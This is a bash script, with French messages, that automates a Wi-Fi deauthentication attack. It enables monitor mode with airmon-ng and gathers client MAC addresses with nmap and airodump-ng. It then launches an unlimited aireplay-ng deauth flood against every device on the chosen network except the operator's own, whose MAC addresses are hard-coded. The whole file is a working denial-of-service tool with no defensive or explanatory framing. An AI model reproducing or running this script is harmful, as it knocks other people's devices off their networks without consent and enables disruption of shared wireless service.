#!/bin/bash
myphonemac="3C:FA:43:42:0D:74"
mymac=$(ifconfig wlan0 | grep -i ether | cut -c15-31 | tr '[:lower:]' '[:upper:]') #F4:8C:50:7F:F5:27
wlan1='wlan1mon'
wlan0='wlan0mon'
echo "$mymac"
myip=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')

airmon-ng
echo "choice ur network"
read reseau

xterm -hold -e "nmap -sP $myip/24 | grep -i MAC\ Address | cut -c14-31 > allmac.txt && killall xterm" &



echo "L'adress mac du reseau choisie:"
ifconfig $reseau | grep -i ether | cut -c15-31

echo "MActivation du Mode Monitor en cours..."
if [ $reseau = "wlan1" ]
	then 
		airmon-ng start wlan1
	else 
		airmon-ng start wlan0
fi

echo "Scan network"
mon=$(iwconfig 2>&1 | grep Monitor | cut -d ' ' -f 1)

airodump-ng $mon -w network

echo "BSSID :"
read bssid
echo "Channel :"
read channel

xterm -hold -e  "airodump-ng $mon -c $channel" 2> /dev/null &
sleep 2


echo "Enregistrement de la nouvelle liste ARP sur le fichier listmac.txt"
cat network-01.csv  | grep -i $bssid | cut -c1-17 >> allmac.txt
awk '!seen[$1]++' allmac.txt > listmac.txt
echo "$(wc -l listmac.txt | cut -c1-2) @MAC trouve"

for i in $(cat listmac.txt) 
	do
			if [ $i != $mymac ]  && [ $i != $bssid ] && [ $i != $myphonemac ]
			then
				echo $i
				#~ echo "######"
				#~ echo $mymac
				xterm -hold -e "aireplay-ng -0 0 -a $bssid -c $i wlan1" 2> /dev/null &
		fi		
	done

#~ echo "Suppressions de lancienne base ARP"
#~ ip -s -s neigh flush all
rm network-*
rm  allmac.txt listmac.txt
#~ arp $iprouter | grep $reseau | cut -c34-50
#~ nbtscan -r `ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`/24
